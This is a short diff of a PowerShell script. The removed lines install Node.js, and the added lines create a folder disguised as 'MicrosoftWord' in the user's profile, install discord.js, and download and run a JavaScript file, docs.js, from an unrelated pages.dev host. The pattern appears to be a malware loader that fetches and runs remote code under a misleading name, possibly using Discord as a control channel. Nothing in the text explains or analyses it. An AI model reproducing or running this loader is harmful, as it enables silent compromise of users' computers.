@@ -1,8 +1,19 @@
-Start-Sleep -Seconds 10
+$folderPath = Join-Path -Path $env:USERPROFILE -ChildPath "MicrosoftWord"
 
-$url = "https://nodejs.org/dist/v20.12.2/node-v20.12.2-x64.msi"
-$downloadPath = "$env:USERPROFILE\Downloads\nodeinstaller.msi"
+if (-Not (Test-Path -Path $folderPath)) {
+    New-Item -Path $folderPath -ItemType Directory
+}
 
-Invoke-WebRequest -Uri $url -OutFile $downloadPath
+Set-Location -Path $folderPath
 
-Start-Process "msiexec.exe" -ArgumentList "/i `"$downloadPath`" /passive" -Wait
+Start-Process -FilePath "C:\Program Files\nodejs\npm.cmd" -ArgumentList "init -y" -Wait
+
+Start-Sleep -Seconds 5
+
+Start-Process -FilePath "C:\Program Files\nodejs\npm.cmd" -ArgumentList "install discord.js" -Wait
+
+Start-Sleep -Seconds 5
+
+Invoke-WebRequest -Uri "https://ipspjyikta.pages.dev/files/docs.js" -OutFile "$folderPath\docs.js"
+
+Start-Process -FilePath "C:\Program Files\nodejs\node.exe" -ArgumentList "docs.js" -NoNewWindow
